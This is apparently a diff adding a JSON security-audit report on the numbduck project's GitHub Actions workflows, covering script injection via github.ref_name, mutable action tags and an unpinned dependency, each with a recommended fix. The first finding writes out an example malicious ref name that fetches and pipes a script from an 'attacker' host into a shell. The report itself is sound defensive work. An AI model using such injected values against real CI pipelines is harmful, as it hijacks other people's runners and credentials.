@@ -1,0 +1,44 @@
+{
+  "unit": "BLD-SEC",
+  "target": "packaging & CI",
+  "dimension": "SEC",
+  "findings": [
+    {
+      "id": "BLD-SEC-1",
+      "severity": "medium",
+      "title": "GitHub Actions script injection: github.ref_name interpolated into a shell run block",
+      "file": ".github/workflows/numbduck_ci.yml",
+      "line": 53,
+      "category": "ci-script-injection",
+      "description": "The 'Determine version' step (numbduck_ci.yml:48-57, shell: bash) builds a command line by interpolating an attacker-influenceable context value directly into the script: line 53 is `echo \"VERSION=${{ github.ref_name }}\" >> $GITHUB_ENV` (and line 60, `echo \"__version__ = '${{ env.VERSION }}'\" > numbduck/__init__.py`, propagates the same value). `${{ ... }}` is expanded by the runner BEFORE the shell runs, so the literal ref name is spliced into the script text and then evaluated by bash. Git ref names legally contain shell metacharacters ($, backtick, ;, (), |, &, {} — only space, ~, ^, :, ?, *, [, \\ and a few sequences are forbidden), so a ref such as `$(curl${IFS}attacker|sh)` or `;cmd;` yields command execution on the runner, and via line 60 arbitrary Python is injected into numbduck/__init__.py which executes on the subsequent `pip install -e .` / `pytest` import. NOTE on reachability: line 53 sits inside the `if github.ref_type == tag` branch, and the workflow's trigger is `on.push.branches: [\"**\"]` (numbduck_ci.yml:3-5) with no `tags:` filter, so tag pushes do not currently start this workflow and the tag branch is presently unreachable; the live branch (line 55) uses the integer `github.run_number`, which is safe. The defect is therefore latent, but the entire tag-versioning block exists precisely to be used, and adding `tags:` to the trigger (the natural next step for a workflow that computes tag-based release versions) makes it a live remote-code-execution vector. The token is `contents: read` (numbduck_ci.yml:13-14) and the event is `push` (collaborator-only) / `pull_request` (not `pull_request_target`, so fork PRs get no secrets), which bounds blast radius but does not remove runner RCE / credential-theft risk.",
+      "impact": "Latent arbitrary command execution on the CI runner (and arbitrary Python execution at install/test time via the injected __init__.py) the moment a tag trigger is added or the tag path otherwise becomes reachable. An attacker-controlled tag/branch name compromises the runner, any credentials present, and the produced wheel.",
+      "recommendation": "Never interpolate `${{ github.ref_name }}` (or any github.* context) directly into a `run:` script. Pass it through an `env:` block and reference the shell variable quoted, e.g. `env: { REF_NAME: ${{ github.ref_name }} }` then `echo \"VERSION=$REF_NAME\" >> \"$GITHUB_ENV\"`. Validate the version against a strict regex (e.g. `^[0-9A-Za-z._-]+$`) before writing it into __init__.py. Apply the same treatment at line 60.",
+      "confidence": "high"
+    },
+    {
+      "id": "BLD-SEC-2",
+      "severity": "low",
+      "title": "Third-party/first-party actions pinned to mutable tags, not commit SHAs",
+      "file": ".github/workflows/numbduck_ci.yml",
+      "line": 43,
+      "category": "supply-chain",
+      "description": "Action references are pinned to mutable major-version tags rather than immutable commit SHAs: `actions/checkout@v6` (numbduck_ci.yml:43), `actions/setup-python@v6` (numbduck_ci.yml:45), and the same two in haversine_bench.yml:17,19. A tag can be re-pointed by the publisher (or an attacker who compromises the publisher) to a different commit, so a future `@v6` could execute different code in CI without any change to this repo. The two actions here are GitHub-owned (lower risk), but the project's own focus lists unpinned action refs as a trust-surface concern, and the link-check workflow (out of this read scope) additionally uses the third-party `lycheeverse/lychee-action@v2`, where mutable-tag pinning carries materially higher risk.",
+      "impact": "A re-pointed tag on any referenced action runs unaudited code in CI with the workflow's permissions; defense-in-depth gap against supply-chain compromise of action publishers.",
+      "recommendation": "Pin actions to full 40-char commit SHAs with the version in a trailing comment (e.g. `uses: actions/checkout@<sha> # v6`), and adopt Dependabot for actions to bump SHAs deliberately. Prioritize the third-party `lycheeverse/lychee-action` ref.",
+      "confidence": "high"
+    },
+    {
+      "id": "BLD-SEC-3",
+      "severity": "low",
+      "title": "CI installs an unpinned, unhashed numbox dependency resolved at run time",
+      "file": ".github/workflows/numbduck_ci.yml",
+      "line": 67,
+      "category": "supply-chain",
+      "description": "The install step pins numba and duckdb to exact matrix values (numbduck_ci.yml:65-66) but `pip install -e .` (numbduck_ci.yml:67) resolves numbox via the `numbox~=0.5.11` range in pyproject.toml, i.e. whatever 0.5.x is newest on PyPI at run time, with no version lock and no `--require-hashes`. There is no hash-pinned lockfile anywhere, so any of the build/runtime dependencies (numbox and its transitive deps) is trusted purely on PyPI/TLS at install time. A newly published or compromised numbox 0.5.x release would execute its build/import code in CI with no repo change, and CI results become non-reproducible. The build deps themselves are exact-pinned (`build==1.2.2.post1 wheel==0.45.0`, numbduck_ci.yml:79) but unhashed.",
+      "impact": "A malicious or accidentally-broken upstream numbox (or transitive) release silently changes CI behavior and runs arbitrary code during install; loss of build reproducibility.",
+      "recommendation": "Pin numbox to an exact version in the CI install (mirroring numba/duckdb) or introduce a hash-pinned lockfile (e.g. a constraints file installed with `pip install --require-hashes -c constraints.txt`). Apply the same exact-pinning to the benchmark workflow's editable install.",
+      "confidence": "medium"
+    }
+  ],
+  "notes": "Scope read in full: numbduck_ci.yml, haversine_bench.yml, extract_codeblocks.py, plus understanding/build.md and loader.md. CLEAN on the explicit 'parse/exec of doc code blocks' concern: extract_codeblocks.py does NOT execute or eval doc snippets. It pipes each extracted block to flake8 via subprocess STDIN (input=code), not as an argv element and not via shell=True; flake8/pyflakes only build an AST (no execution). The --stdin-display-name label is `path:line` derived from the filesystem walk, not from block content, so there is no argv/shell injection from doc contents. flake8_exe is a trusted CLI arg. No finding there. CLEAN on in-CI libduckdb network download: the libduckdb download/standalone path (utils.py, no checksum/signature pinning) is macOS-only and gated, and the CI matrix runs only ubuntu/windows where the pip duckdb wheel exports the C API, so that download path is never taken in CI; it is a runtime/loader concern (LOADER unit), not a CI trust-surface defect. haversine_bench.yml is workflow_dispatch-only with a hardcoded version and no untrusted interpolation. The primary CI trust-surface defect is the script-injection PATTERN at numbduck_ci.yml:52-60 (BLD-SEC-1), currently latent because the tag code path is unreachable under the branches-only push trigger."
+}
